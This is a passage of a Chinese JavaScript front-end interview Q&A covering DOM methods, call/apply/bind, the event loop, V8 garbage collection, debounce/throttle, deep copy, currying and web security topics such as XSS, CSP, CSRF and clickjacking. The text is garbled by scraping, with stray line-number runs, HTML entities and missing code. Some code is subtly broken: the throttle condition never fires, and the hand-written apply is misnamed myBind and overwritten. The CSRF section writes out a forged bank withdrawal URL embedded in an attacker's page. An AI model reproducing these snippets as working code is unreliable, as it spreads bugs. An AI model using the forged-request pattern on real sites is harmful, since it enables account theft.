中缺少的一些面向对象语言的特性，但本质上来说它只是一种语法糖，不是一个新的东西，其背后还是原型继承的思想。通过加入 class 可以有利于我们更好的组织代码。 在 class 中添加的方法，其实是添加在类的原型上的。 详细资料可以参考： 《ECMAScript 6 实现了 class，对 JavaScript 前端开发有什么意义？》 《Class 的基本语法》 70. documen.write 和 innerHTML 的区别？ document.write 的内容会代替整个文档内容，会重写整个页面。 innerHTML 的内容只是替代指定元素的内容，只会重写页面中的部分内容。 详细资料可以参考： 《简述 document.write 和 innerHTML 的区别。》 71. DOM 操作——怎样添加、移除、移动、复制、创建和查找节点？ 123456789101112131415161718192021222324（1）创建新节点 createDocumentFragment(node) createElement(node) createTextNode(text) （2）添加、移除、替换、插入 appendChild(node) removeChild(node) replaceChild(new,old) insertBefore(new,old)（3）查找 getElementById() getElementsByName() getElementsByTagName() getElementsByClassName() querySelector() querySelectorAll() （4）属性操作 getAttribute(key) setAttribute(key,value) hasAttribute(key) removeAttribute(key) 详细资料可以参考： 《DOM 概述》 《原生 JavaScript 的 DOM 操作汇总》 《原生 JS 中 DOM 节点相关 API 合集》 72. innerHTML 与 outerHTML 的区别？对于这样一个 HTML 元素：1234&lt;div&gt; content &lt;br/&gt;&lt;/div&gt;。 innerHTML：内部 HTML，content&lt;br/&gt;outerHTML：外部 HTML，&lt;div&gt;content&lt;br/&gt;&lt;/div&gt;innerText：内部文本，contentouterText：内部文本，content 73. .call() 和 .apply() 的区别？ 它们的作用一模一样，区别仅在于传入参数的形式的不同。 apply 接受两个参数，第一个参数指定了函数体内 this 对象的指向，第二个参数为一个带下标的集合，这个集合可以为数组，也可以为类数组，apply 方法把这个集合中的元素作为参数传递给被调用的函数。 call 传入的参数数量不固定，跟 apply 相同的是，第一个参数也是代表函数体内的 this 指向，从第二个参数开始往后，每个参数被依次传入函数。 74. JavaScript 类数组对象的定义？ 一个拥有 length 属性和若干索引属性的对象就可以被称为类数组对象，类数组对象和数组类似，但是不能调用数组的方法。 常见的类数组对象有 arguments 和 DOM 方法的返回结果，还有一个函数也可以被看作是类数组对象，因为它含有 length属性值，代表可接收的参数个数。 常见的类数组转换为数组的方法有这样几种： （1）通过 call 调用数组的 slice 方法来实现转换 1234&gt;（2）通过 call 调用数组的 splice 方法来实现转换 &#96;&#96;&#96;Array.prototype.splice.call(arrayLike, 0); （3）通过 apply 调用数组的 concat 方法来实现转换 arrayLike)```1234&gt;（4）通过 Array.from 方法来实现转换&#96;&#96;&#96;Array.from(arrayLike); 75. 数组和对象有哪些原生方法，列举一下？ 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。 数组插入方法 splice()，影响原数组 查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法 数组归并方法 reduce() 和 reduceRight() 方法 76. 数组的 fill 方法？ fill() 方法用一个固定值填充一个数组中从起始索引到终止索引内的全部元素。不包括终止索引 fill 方法接受三个参数 value，start 以及 end，start 和 end 参数是可选的，其默认值分别为 0 和 this 对象的 length 属性值。 77. [,,,] 的长度？等于逗号的数量 尾后逗号 （有时叫做“终止逗号”）在向 JavaScript 代码添加元素、参数、属性时十分有用。如果你想要添加新的属性，并且上一行已经使用了尾后逗号，你可以仅仅添加新的一行，而不需要修改上一行。这使得版本控制更加清晰，以及代码维护麻烦更少。 JavaScript 一开始就支持数组字面值中的尾后逗号，随后向对象字面值（ECMAScript 5）中添加了尾后逗号。最近（ECMAScript 2017），又将其添加到函数参数中。但是 JSON 不支持尾后逗号。 如果使用了多于一个尾后逗号，会产生间隙。 带有间隙的数组叫做稀疏数组（密致数组没有间隙）。稀疏数组的长度为逗号的数量。 详细资料可以参考： 《尾后逗号》 78. JavaScript 中的作用域与变量声明提升？ 变量提升的表现是，无论我们在函数中何处位置声明的变量，好像都被提升到了函数的首部，我们可以在变量声明前访问到而不会报错。 造成变量声明提升的本质原因是 js 引擎在代码执行前有一个解析的过程，创建了执行上下文，初始化了一些代码执行时需要用到的对象。当我们访问一个变量时，我们会到当前执行上下文中的作用域链中去查找，而作用域链的首端指向的是当前执行上下文的变量对象，这个变量对象是执行上下文的一个属性，它包含了函数的形参、所有的函数和变量声明，这个对象的是在代码解析的时候创建的。这就是会出现变量声明提升的根本原因。 详细资料可以参考： 《JavaScript 深入理解之变量对象》 79. 如何编写高性能的 Javascript ？ （1）使用位运算代替一些简单的四则运算。 （2）避免使用过深的嵌套循环。 （3）不要使用未定义的变量。 （4）当需要多次访问数组长度时，可以用变量保存起来，避免每次都会去进行属性查找。 详细资料可以参考： 《如何编写高性能的 Javascript？》 80. 简单介绍一下 V8 引擎的垃圾回收机制v8 的垃圾回收机制基于分代回收机制，这个机制又基于世代假说，这个假说有两个特点，一是新生的对象容易早死，另一个是不死的对象会活得更久。基于这个假说，v8 引擎将内存分为了新生代和老生代。 新创建的对象或者只经历过一次的垃圾回收的对象被称为新生代。经历过多次垃圾回收的对象被称为老生代。 新生代被分为 From 和 To 两个空间，To 一般是闲置的。当 From 空间满了的时候会执行 Scavenge 算法进行垃圾回收。当我们执行垃圾回收算法的时候应用逻辑将会停止，等垃圾回收结束后再继续执行。这个算法分为三步： （1）首先检查 From 空间的存活对象，如果对象存活则判断对象是否满足晋升到老生代的条件，如果满足条件则晋升到老生代。如 果不满足条件则移动 To 空间。 （2）如果对象不存活，则释放对象的空间。 （3）最后将 From 空间和 To 空间角色进行交换。 新生代对象晋升到老生代有两个条件： （1）第一个是判断是对象否已经经过一次 Scavenge 回收。若经历过，则将对象从 From 空间复制到老生代中；若没有经历，则 复制到 To 空间。 （2）第二个是 To 空间的内存使用占比是否超过限制。当对象从 From 空间复制到 To 空间时，若 To 空间使用超过 25%，则对 象直接晋升到老生代中。设置 25% 的原因主要是因为算法结束后，两个空间结束后会交换位置，如果 To 空间的内存太小，会 影响后续的内存分配。 老生代采用了标记清除法和标记压缩法。标记清除法首先会对内存中存活的对象进行标记，标记结束后清除掉那些没有标记的对象。由于标记清除后会造成很多的内存碎片，不便于后面的内存分配。所以了解决内存碎片的问题引入了标记压缩法。 由于在进行垃圾回收的时候会暂停应用的逻辑，对于新生代方法由于内存小，每次停顿的时间不会太长，但对于老生代来说每次垃圾回收的时间长，停顿会造成很大的影响。 为了解决这个问题 V8 引入了增量标记的方法，将一次停顿进行的过程分为了多步，每次执行完一小步就让运行逻辑执行一会，就这样交替运行。 详细资料可以参考： 《深入理解 V8 的垃圾回收原理》 《JavaScript 中的垃圾回收》 81. 哪些操作会造成内存泄漏？ 第一种情况是我们由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。 第二种情况是我们设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。 第三种情况是我们获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。 82. 需求：实现一个页面操作不会整页刷新的网站，并且能在浏览器前进、后退时正确响应。给出你的技术实现方案？如今主流的使用方案：PJAX 通过使用 pushState + ajax 实现浏览器无刷新前进后退，当一次 ajax 调用成功后我们将一条 state 记录加入到 history对象中。一条 state 记录包含了 url、title 和 content 属性，在 popstate 事件中可以获取到这个 state 对象，我们可以使用 content 来传递数据。最后我们通过对 window.onpopstate 事件监听来响应浏览器的前进后退操作。 注意：用于替换老url的新url两者的页面必须同源 使用 pushState 来实现有两个问题，一个是打开首页时没有记录，我们可以使用 replaceState 来将首页的记录替换，另一个问题是当一个页面刷新的时候，仍然会向服务器端请求数据，因此如果请求的 url 需要后端的配合将其重定向到一个页面。 详细资料可以参考： 《pushState + ajax 实现浏览器无刷新前进后退》 83. 如何判断当前脚本运行在浏览器还是 node 环境中？（阿里）1this &#x3D;&#x3D;&#x3D; window ? &#39;browser&#39; : &#39;node&#39;; 通过判断 Global 对象是否为 window，如果不为 window，当前脚本没有运行在浏览器中。 84. 把 script 标签放在页面的最底部的 body 封闭之前和封闭之后有什么区别？浏览器会如何解析它们？ 详细资料可以参考： 《为什么把 script 标签放在 body 结束标签之后 html 结束标签之前？》 《从 Chrome 源码看浏览器如何加载资源》 85. 移动端的点击事件的有延迟，时间是多久，为什么会有？ 怎么解决这个延时？ 移动端点击有 300ms 的延迟是因为移动端会有双击缩放的这个操作，因此浏览器在 click 之后要等待 300ms，看用户有没有下一次点击，来判断这次操作是不是双击。 有三种办法来解决这个问题 （1）通过 meta 标签禁用网页的缩放。（2）通过 meta 标签将网页的 viewport 设置为 ideal viewport。（3）调用一些 js 库，比如 FastClick 什么是点击穿透？ 假如页面上有两个元素A和B。B元素在A元素之上。我们在B元素的touchstart事件上注册了一个回调函数，该回调函数的作用是隐藏B元素。我们发现，当我们点击B元素，B元素被隐藏了，随后，A元素触发了click事件。这是因为在移动端浏览器，事件执行的顺序是touchstart &gt; touchend &gt; click。而click事件有300ms的延迟，当touchstart事件把B元素隐藏之后，隔了300ms，浏览器触发了click事件，但是此时B元素不见了，所以该事件被派发到了A元素身上。如果A元素是一个链接，那此时页面就会意外地跳转。 《移动端 300ms 点击延迟和点击穿透》 86. 什么是“前端路由”？什么时候适合使用“前端路由”？“前端路由”有哪些优点和缺点？（1）什么是前端路由？ 前端路由就是把不同路由对应不同的内容或页面的任务交给前端来做，之前是通过服务端根据 url 的不同返回不同的页面实现的。 （2）什么时候使用前端路由？ 在单页面应用，大部分页面结构不变，只改变部分内容的使用 （3）前端路由有什么优点和缺点？ 优点用户体验好，不需要每次都从服务器全部获取，快速展现给用户 缺点单页面无法记住之前滚动的位置，无法在前进，后退的时候记住滚动的位置 前端路由一共有两种实现方式，一种是通过 hash 的方式，一种是通过使用 pushState 的方式。 详细资料可以参考： 《什么是“前端路由”》 《浅谈前端路由》 《前端路由是什么东西？》 87. 如何测试前端代码么？ 知道 BDD, TDD, Unit Test 么？ 知道怎么测试你的前端工程么(mocha, sinon, jasmin, qUnit..)？ 详细资料可以参考： 《浅谈前端单元测试》 88. 检测浏览器版本版本有哪些方式？检测浏览器版本一共有两种方式： 一种是检测 window.navigator.userAgent 的值，但这种方式很不可靠，因为 userAgent 可以被改写，并且早期的浏览器如ie，会通过伪装自己的 userAgent 的值为 Mozilla 来躲过服务器的检测。 第二种方式是功能检测，根据每个浏览器独有的特性来进行判断，如 ie 下独有的 ActiveXObject。 详细资料可以参考： 《JavaScript 判断浏览器类型》 89. 什么是 Polyfill ？ 123456Polyfill 指的是用于实现浏览器并不支持的原生 API 的代码。比如说 querySelectorAll 是很多现代浏览器都支持的原生 Web API，但是有些古老的浏览器并不支持，那么假设有人写了一段代码来实现这个功能使这些浏览器也支持了这个功能，那么这就可以成为一个 Polyfill。一个 shim 是一个库，有自己的 API，而不是单纯实现原生不支持的 API。 详细资料可以参考： 《Web 开发中的“黑话”》 《Polyfill 为何物》 90. 使用 JS 实现获取文件扩展名？123function getFileExtension(filename) &#123; return filename.slice((filename.lastIndexOf(\".\") - 1 &gt;&gt;&gt; 0) + 2);&#125; String.lastIndexOf返回指定值的最后出现位置(本例里是：.)。如果返回-1，表示没找到该指定值 当参数是filename，.hiddenfile时，lastIndexOf的返回值分别是-1和0。然后无符号移位操作符将-2转成了4294967294、-1转成了4294967295，这个小技巧保证了极端状况下取值也不会异常 然后String.prototype.slice就以上面的计算结果作为起始下标从原始字符串中提取出了正确的文件扩展名。如果上一步骤计算出的起始下标大于原始字符串长度，则返回’’ 91. 介绍一下 js 的节流与防抖？函数防抖： 在事件被触发 n 秒后再执行回调，如果在这 n 秒内事件又被触发，则重新计时。 考虑一个场景，有一个按钮点击会触发网络请求，但是我们并不希望每次点击都发起网络请求，而是当用户点击按钮一段时间后没有再次点击的情况才去发起网络请求，对于这种情况我们就可以使用防抖。 函数节流： 规定一个单位时间，在这个单位时间内，只能有一次触发事件的回调函数执行，如果在同一个单位时间内某事件被触发多次，只有一次能生效。 考虑一个场景，滚动事件中会发起网络请求，但是我们并不希望用户在滚动过程中一直发起请求，而是隔一段时间发起一次，对于这种情况我们就可以使用节流。1234567891011121314151617181920212223242526272829303132333435363738//函数防抖的实现function debounce(fn, wait) &#123; var timer = null; return function () &#123; var context = this, args = arguments; // 如果此时存在定时器的话，则取消之前的定时器重新记时 if (timer) &#123; clearTimeout(timer); timer = null; &#125; // 设置定时器，使事件间隔指定事件后执行 timer = setTimeout(() =&gt; &#123; fn.apply(context, args); &#125;, wait); &#125;&#125;//函数节流的实现function throttle(fn, delay) &#123; var preTime = Date.now(); return function () &#123; var context = this, args = arguments, nowTime = Date.now(); // 如果两次时间间隔超过了指定时间，则执行函数。 if (preTime - nowTime &gt;= delay) &#123; fn.apply(context, args); preTime = Date.now(); &#125; &#125;&#125; 函数防抖是指在事件被触发 n 秒后再执行回调，如果在这 n 秒内事件又被触发，则重新计时。这可以使用在一些点击请求的事件上，避免因为用户的多次点击向后端发送多次请求。 函数节流是指规定一个单位时间，在这个单位时间内，只能有一次触发事件的回调函数执行，如果在同一个单位时间内某事件被触发多次，只有一次能生效。节流可以使用在 scroll 函数的事件监听上，通过事件节流来降低事件调用的频率。 92. Object.is() 与原来的比较操作符===、==的区别？ 两等号判等，会在比较时进行类型转换。. 三等号判等（判断严格），比较时不进行隐式类型转换，（类型不同则会返回false）。 Object.is 在三等号判等的基础上特别处理了 NaN 、-0 和 +0 ，保证 -0 和 +0 不再相同，但 Object.is(NaN, NaN) 会返回 true. Object.is 应被认为有其特殊的用途，而不能用它认为它比其它的相等对比更宽松或严格。 93. encodeURI,encodeURIComponent 有什么区别？ encodeURI作用于整个URI，他不会对本身属于URI的特殊字符进行编码，例如：冒号、正斜杠、问号和井号。 encodeURIComponent 是对 URI 的部分进行转义，会对所有的非标准字符进行转义 94. Unicode 和 UTF-8 之间的关系？ Unicode 是一种字符集合，现在可容纳 100 多万个字符。每个字符对应一个不同的 Unicode 编码，它只规定了符号的二进制代码，却没有规定这个二进制代码在计算机中如何编码传输。 UTF-8 是一种对 Unicode 的编码方式，它是一种变长的编码方式，可以用 1~4 个字节来表示一个字符。 95. js 的事件循环是什么？ 因为 js 是单线程运行的，在代码执行的时候，通过将不同函数的执行上下文压入执行栈中来保证代码的有序执行。在执行同步代码的时候，如果遇到了异步事件，js 引擎并不会一直等待其返回结果，而是会将这个事件挂起，继续执行执行栈中的其他任务。当异步事件执行完毕后，再将异步事件对应的回调加入到与当前执行栈中不同的另一个任务队列中等待执行。任务队列可以分为宏任务对列和微任务对列，当当前执行栈中的事件执行完毕后，js 引擎首先会判断微任务对列中是否有任务可以执行，如果有就将微任务队首的事件压入栈中执行。当微任务对列中的任务都执行完成后再去判断宏任务对列中的任务。 微任务包括了 promise 的回调、node 中的 process.nextTick 、对 Dom 变化监听的 MutationObserver。 宏任务包括了 script 脚本的执行、setTimeout ，setInterval ，setImmediate 一类的定时事件，还有如 I/O 操作、UI 渲染等。 96. js 中的深浅拷贝实现？123456789101112131415161718192021222324252627//浅拷贝的实现function shallowCopy(object) &#123; // 只拷贝对象 if (!object || typeof object !== \"object\") return; // 根据 object 的类型判断是新建一个数组还是对象 let newObject = Array.isArray(object) ? [] : &#123;&#125;; // 遍历 object，并且判断是 object 的属性才拷贝 for (let key in object) &#123; if (object.hasOwnProperty(key)) &#123; newObject[key] = object[key]; &#125; &#125; return newObject;&#125;//深拷贝的实现function deepCopy(object) &#123; if (!object || typeof object !== \"object\") return; let newObject = Array.isArray(object) ? [] : &#123;&#125;; for (let key in object) &#123; if (object.hasOwnProperty(key)) &#123; newObject[key] = typeof object[key] === \"object\" ? deepCopy(object[key]) : object[key]; &#125; &#125; return newObject;&#125; 浅拷贝指的是将一个对象的属性值复制到另一个对象，如果有的属性的值为引用类型的话，那么会将这个引用的地址复制给对象，因此两个对象会有同一个引用类型的引用。浅拷贝可以使用 Object.assign 和展开运算符来实现。 深拷贝相对浅拷贝而言，如果遇到属性值为引用类型的时候，它新建一个引用类型并将对应的值复制给它，因此对象获得的一个新的引用类型而不是一个原有类型的引用。深拷贝对于一些对象可以使用 JSON 的两个函数来实现，但是由于 JSON 的对象格式比 js 的对象格式更加严格，所以如果属性值里边出现函数或者 Symbol 类型的值时，会转换失败。 97. 手写 call、apply 及 bind 函数123456789101112131415161718192021222324252627282930313233//手写callFunction.prototype.myCall = function(context, ...args)&#123; if(typeof this !== 'function')&#123; return new Error('typeError') &#125; let ctx = context || window ctx.fun = this let res = ctx.fun(...args) delete ctx.fun return res&#125;//手写applyFunction.prototype.myBind = function(context, arr)&#123; if(typeof this !== 'function')&#123; return new Error('typeError') &#125; let ctx = context || window ctx.fun = this let res = ctx.fun(...arr) delete ctx.fun return res&#125;//手写bindFunction.prototype.myBind = function (context, ...args1)&#123; let self = this function fbound(...args2)&#123; let arr = [...args1, ...args2] return self.apply(this instanceof self ? this : context, arr) &#125; fbound.prototype = self.prototype return fbound&#125; call 函数的实现步骤： （1）判断调用对象是否为函数，即使我们是定义在函数的原型上的，但是可能出现使用 call 等方式调用的情况。（2）判断传入上下文对象是否存在，如果不存在，则设置为 window 。（3）处理传入的参数，截取第一个参数后的所有参数。（4）将函数作为上下文对象的一个属性。（5）使用上下文对象来调用这个方法，并保存返回结果。（6）删除刚才新增的属性。（7）返回结果。 apply 函数的实现步骤： （1）判断调用对象是否为函数，即使我们是定义在函数的原型上的，但是可能出现使用 call 等方式调用的情况。（2）判断传入上下文对象是否存在，如果不存在，则设置为 window 。（3）将函数作为上下文对象的一个属性。（4）判断参数值是否传入（4）使用上下文对象来调用这个方法，并保存返回结果。（5）删除刚才新增的属性（6）返回结果 bind 函数的实现步骤： （1）判断调用对象是否为函数，即使我们是定义在函数的原型上的，但是可能出现使用 call 等方式调用的情况。（2）保存当前函数的引用，获取其余传入参数值。（3）创建一个函数返回（4）函数内部使用 apply 来绑定函数调用，需要判断函数作为构造函数的情况，这个时候需要传入当前函数的 this 给 apply 调用，其余情况都传入指定的上下文对象。 98. 函数柯里化的实现函数柯里化指的是一种将使用多个参数的一个函数转换成一系列使用一个参数的函数的技术。 1234567891011121314151617181920212223242526//函数柯里化ES6function curry(fn, ...args) &#123; return fn.length &lt;= args.length ? fn(...args) : curry.bind(null, fn, ...args);&#125;//函数柯里化ES5function curry(fn, args) &#123; // 获取函数需要的参数长度 let length = fn.length; args = args || []; return function () &#123; let subArgs = args.slice(0); // 拼接得到现有的所有参数 for (let i = 0; i &lt; arguments.length; i++) &#123; subArgs.push(arguments[i]); &#125; // 判断参数的长度是否已经满足函数所需参数的长度 if (subArgs.length &gt;= length) &#123; // 如果满足，执行函数 return fn.apply(this, subArgs); &#125; else &#123; // 如果不满足，递归返回科里化的函数，等待参数的传入 return curry.call(this, fn, subArgs); &#125; &#125;&#125; 99. 为什么 0.1 + 0.2 != 0.3？如何解决这个问题？ 当计算机计算 0.1+0.2 的时候，实际上计算的是这两个数字在计算机里所存储的二进制，0.1 和 0.2 在转换为二进制表示的时候会出现位数无限循环的情况。 js 中是以 64 位双精度格式来存储数字的，只有 53 位的有效数字，超过这个长度的位数会被截取掉这样就造成了精度丢失的问题。这是第一个会造成精度丢失的地方。 在对两个以 64 位双精度格式的数据进行计算的时候，首先会进行对阶的处理，对阶指的是将阶码对齐，也就是将小数点的位置对齐后，再进行计算，一般是小阶向大阶对齐，因此小阶的数在对齐的过程中，有效数字会向右移动，移动后超过有效位数的位会被截取掉，这是第二个可能会出现精度丢失的地方。 当两个数据阶码对齐后，进行相加运算后，得到的结果可能会超过 53 位有效数字，因此超过的位数也会被截取掉，这是可能发生精度丢失的第三个地方。 对于这样的情况，我们可以将其转换为整数后再进行运算，运算后再转换为对应的小数，以这种方式来解决这个问题。 1parseFloat((0.1 + 0.2).toFixed(10)) &#x3D;&#x3D;&#x3D; 0.3 &#x2F;&#x2F; true 详细资料可以参考： 100. 原码、反码和补码的介绍 原码是计算机中对数字的二进制的定点表示方法，最高位表示符号位，其余位表示数值位。优点是易于分辨，缺点是不能够直接参与运算。 正数的反码和其原码一样；负数的反码，符号位为1，数值部分按原码取反。如 [+7]原 = 00000111，[+7]反 = 00000111； [-7]原 = 10000111，[-7]反 = 11111000。 正数的补码和其原码一样；负数的补码为其反码加1。 例如 [+7]原 = 00000111，[+7]反 = 00000111，[+7]补 = 00000111；[-7]原 = 10000111，[-7]反 = 11111000，[-7]补 = 11111001 之所以在计算机中使用补码来表示负数的原因是，这样可以将加法运算扩展到所有的数值计算上，因此在数字电路中我们只需要考虑加法器的设计就行了，而不用再为减法设置新的数字电路。 101. toPrecision 和 toFixed 和 Math.round 的区别？ toPrecision 用于处理精度，精度是从左至右第一个不为 0 的数开始数起。 toFixed 是对小数点后指定位数取整，从小数点开始数起。 Math.round 是将一个数字四舍五入到一个整数。 102. 什么是 XSS 攻击？如何防范 XSS 攻击？ XSS 攻击指的是跨站脚本攻击，是一种代码注入攻击。攻击者通过在网站注入恶意脚本，使之在用户的浏览器上运行，从而盗取用户的信息如 cookie 等。 XSS 的本质是因为网站没有对恶意代码进行过滤，与正常的代码混合在一起了，浏览器没有办法分辨哪些脚本是可信的，从而导致了恶意代码的执行。 防范方法： 记住一点 “所有用户输入都是不可信的”，所以得做输入过滤和转义cookie 设置 httpOnly 103. 什么是 CSP？ :CSP 指的是内容安全策略，它的本质是建立一个白名单，告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截由浏览器自己来实现。 通常有两种方式来开启 CSP，一种是设置 HTTP 首部中的 Content-Security-Policy，一种是设置 meta 标签s的方式 1&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot;&gt; 详细资料可以参考：《内容安全策略（CSP）》《前端面试之道》 104. 什么是 CSRF 攻击？如何防范 CSRF 攻击？CSRF攻击与防御（写得非常好）对于CSRF攻击 CSRF 攻击的本质是利用了 cookie 会在同源请求中携带发送给服务器的特点，以此来实现用户的冒充。 攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。 这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 同源限制策略阻止了第三方网站获取到本网站的cookie，但是，由于cookie会在同源请求中自动携带，第三方网站要想攻击用户账户根本用不着读取cookie，只需要在cookie过期之前伪造一个请求，诱导用户提交这个请求，那么就完成了对用户账户的一次攻击 注意这里“同源请求”这个词，这里的同源和浏览器当前页面的URL没有一点关系。换句话说对于www.api.com/userinfo这个接口，你可以访问，张三可以访问，李四可以访问。所谓的同源，是服务端给cookie设置的一个认证domain，在客户端访问一个url的时候如果检测到这个cookie的domain匹配这个url，那么就直接携带。总结：cookie的domain认证是服务器设置的，它不关心你在哪里使用 所以这也留下了CSRF攻击的隐患 一般的 CSRF 攻击类型有三种： 第一种是 GET 类型的 CSRF 攻击，比如在网站中的一个 img 标签里构建一个请求，当用户打开这个网站的时候就会自动发起提交。 第二种是 POST 类型的 CSRF 攻击，比如说构建一个表单，然后隐藏它，当用户进入页面时，自动提交这个表单。 第三种是链接类型的 CSRF 攻击，比如说在 a 标签的 href 属性里构建一个请求，然后诱导用户去点击。 CSRF 可以用下面几种方法来防护： 验证 HTTP Referer 字段根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站 第二种方法是使用 CSRF Token 来进行验证，服务器向用户返回一个随机数 Token ，当网站再次发起请求时，在请求参数中加入服务器端返回的 token ，然后服务器对这个 token 进行验证 第三种方式是使用在设置 cookie 属性的时候设置 Samesite ，限制 cookie 不能作为被第三方使用，从而可以避免被攻击者利用。Samesite 一共有两种模式，一种是严格模式，在严格模式下 cookie 在任何情况下都不可能作为第三方 Cookie 使用，在宽松模式下，cookie 可以被请求是 GET 请求，且会发生页面跳转的请求所使用。 105. 什么是 Samesite Cookie 属性？ Samesite Cookie 表示同站 cookie，避免 cookie 被第三方所利用。 将 Samesite 设为 strict ，这种称为严格模式，表示这个 cookie 在任何情况下都不可能作为第三方 cookie。 将 Samesite 设为 Lax ，这种模式称为宽松模式，如果这个请求是个 GET 请求，并且这个请求改变了当前页面或者打开了新的页面，那么这个 cookie 可以作为第三方 cookie，其余情况下都不能作为第三方 cookie。 使用这种方法的缺点是，因为它不支持子域，所以子域没有办法与主域共享登录信息，每次转入子域的网站，都回重新登录。还有一个问题就是它的兼容性不够好。 106. 什么是点击劫持？如何防范点击劫持？ 点击劫持是一种视觉欺骗的攻击手段，攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。 我们可以在 http 相应头中设置 X-FRAME-OPTIONS 来防御用 iframe 嵌套的点击劫持攻击。通过不同的值，可以规定页面在特定的一些情况才能作为 iframe 来使用。 107. SQL 注入攻击？ SQL 注入攻击指的是攻击者在 HTTP 请求中注入恶意的 SQL 代码，服务器使用参数构建数据库 SQL 命令时，恶意 SQL 被一起构造，破坏原有 SQL 结构，并在数据库中执行，达到编写程序时意料之外结果的攻击行为。 108. 什么是 MVVM？比之 MVC 有什么区别？什么又是 MVP ？MVC、MVP 和 MVVM 是三种常见的软件架构设计模式，主要通过分离关注点的方式来组织代码结构，优化我们的开发效率。 比如说我们实验室在以前项目开发的时候，使用单页应用时，往往一个路由页面对应了一个脚本文件，所有的页面逻辑都在一个脚本文件里。页面的渲染、数据的获取，对用户事件的响应所有的应用逻辑都混合在一起，这样在开发简单项目时，可能看不出什么问题，当时一旦项目变得复杂，那么整个文件就会变得冗长，混乱，这样对我们的项目开发和后期的项目维护是非常不利的。 MVC 通过分离 Model、View 和 Controller 的方式来组织代码结构。其中 View 负责页面的显示逻辑，Model 负责存储页面的业务数据，以及对相应数据的操作。并且 View 和 Model 应用了观察者模式，当 Model 层发生改变的时候它会通知有关 View 层更新页面。Controller 层是 View 层和 Model 层的纽带，它主要负责用户与应用的响应操作，当用户与页面产生交互的时候，Controller 中的事件触发器就开始工作了，通过调用 Model 层，来完成对 Model 的修改，然后 Model 层再去通知 View 层更新。 MVP 模式与 MVC 唯一不同的在于 Presenter 和 Controller。在 MVC 模式中我们使用观察者模式，来实现当 Model 层数据发生变化的时候，通知 View 层的更新。这样 View 层和 Model 层耦合在一起，当项目逻辑变得复杂的时候，可能会造成代码的混乱，并且可能会对代码的复用性造成一些问题。MVP 的模式通过使用 Presenter 来实现对 View 层和 Model 层的解耦。MVC 中的Controller 只知道 Model 的接口，因此它没有办法控制 View 层的更新，MVP 模式中，View 层的接口暴露给了 Presenter因此我们可以在 Presenter 中将 Model 的变化和 View 的变化绑定在一起，以此来实现 View 和 Model 的同步更新。这样就实现了对 View 和 Model 的解耦，Presenter 还包含了其他的响应逻辑。 MVVM 模式中的 VM，指的是 ViewModel，它和 MVP 的思想其实是相同的，不过它通过双向的数据绑定，将 View 和 Model 的同步更新给自动化了。当 Model 发生变化的时候，ViewModel 就会自动更新；ViewModel 变化了，View 也会更新。这样就将 Presenter 中的工作给自动化了。我了解过一点双向数据绑定的原理，比如 vue 是通过使用数据劫持和发布订阅者模式来实现的这一功能。 109. vue 双向数据绑定原理？vue 